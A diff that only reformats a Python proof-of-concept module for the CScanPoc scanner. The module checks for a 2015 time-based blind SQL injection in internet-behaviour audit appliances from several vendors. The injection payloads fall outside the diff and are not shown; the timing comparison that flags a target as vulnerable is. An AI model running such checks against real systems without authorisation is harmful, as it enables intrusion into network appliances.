@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 import time
 
+
 class Vuln(ABVuln):
     vuln_id = 'Network_Security_Audit_System_0002'  # 平台漏洞编号，留空
     name = '上网行为审计系统 通用型SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-06-23'  # 漏洞公布时间
     desc = '''
         13家厂商（17种设备）网上行为（审计）设备系统通用型SQL注入（无需登录涉及网神&启明&神舟数码等）。
@@ -36,6 +37,7 @@ class Vuln(ABVuln):
     product = '上网行为审计系统'  # 漏洞应用名称
     product_version = '上网行为审计系统'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'd9fb3cdf-a944-4028-887f-cb09d7aee7f7'
     author = '47bwy'  # POC编写者
@@ -49,7 +51,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer     :  http://wooyun.org/bugs/wooyun-2015-0122195
+            # refer     :  http://wooyun.org/bugs/wooyun-2015-0122195
             hh = hackhttp.hackhttp()
             arg = self.target
             start_time1 = time.time()
@@ -62,8 +64,8 @@ class Poc(ABPoc):
             code2, head, res, errcode, _ = hh.http(target)
             flase_time = time.time() - start_time2
 
-            if (code1 == 200) and (code2 == 200) and true_time<2 and (flase_time > 5):
-                #security_hole(target)
+            if (code1 == 200) and (code2 == 200) and true_time < 2 and (flase_time > 5):
+                # security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -72,6 +74,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
